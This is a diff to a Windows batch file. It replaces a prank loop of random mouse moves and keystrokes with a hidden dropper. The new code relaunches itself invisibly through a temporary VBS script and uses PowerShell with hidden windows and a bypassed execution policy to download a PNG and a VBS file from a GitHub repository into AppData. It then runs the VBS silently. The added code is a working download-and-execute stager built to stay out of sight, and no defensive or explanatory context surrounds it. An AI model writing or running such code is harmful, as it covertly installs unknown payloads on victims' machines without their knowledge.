@@ -1,27 +1,33 @@
 @echo off
-:loop
+:: =========================================
+:: Self-hide check
+:: =========================================
+if "%~1" neq "hidden" (
+    :: Create temporary VBS to relaunch this batch hidden
+    set "vbs=%TEMP%\hide_updater.vbs"
+    >"%vbs%" echo Set ws = CreateObject("Wscript.Shell")
+    >>"%vbs%" echo ws.Run "cmd /c ""%~f0 hidden""", 0, False
+    cscript //nologo "%vbs%"
+    del "%vbs%"
+    exit /b
+)
+REM =====================================================
+REM SECOND STAGE
+REM =====================================================
 
-:: Random action 0-5 for keys/minimize
-set /a r=%random% %% 6
+REM Set download paths
+set "APPDATA_PATH=%APPDATA%"
+set "PNG_FILE=%APPDATA_PATH%\crineson.png"
+set "VBS_FILE=%APPDATA_PATH%\yay.vbs"
 
-:: Much faster delay: 100–200 ms
-set /a delay=(%random% %% 101) + 100
+REM Download crineson.png
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/crineson.png' -OutFile '%PNG_FILE%'"
 
-:: Move mouse randomly
-powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $scr=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $x=Get-Random -Minimum 0 -Maximum $scr.Width; $y=Get-Random -Minimum 0 -Maximum $scr.Height; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x,$y)"
+REM Download yay.vbs
+powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/dexovision/rubitoutducky/main/yay.vbs' -OutFile '%VBS_FILE%'"
 
-:: Simulate click via Enter key (fast)
-powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('~')"
+REM Run yay.vbs silently
+start "" /wait wscript.exe "%VBS_FILE%"
 
-:: Random key press or minimize
-if %r%==0 powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('w')"
-if %r%==1 powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('a')"
-if %r%==2 powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('s')"
-if %r%==3 powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('d')"
-if %r%==4 powershell -Command "$wshell=New-Object -ComObject WScript.Shell; $wshell.SendKeys('{F11}')"
-if %r%==5 powershell -Command "(New-Object -ComObject Shell.Application).MinimizeAll()"
-
-:: Very short wait (fast speed)
-powershell -Command "Start-Sleep -Milliseconds %delay%"
-
-goto loop
+echo Done.
+pause
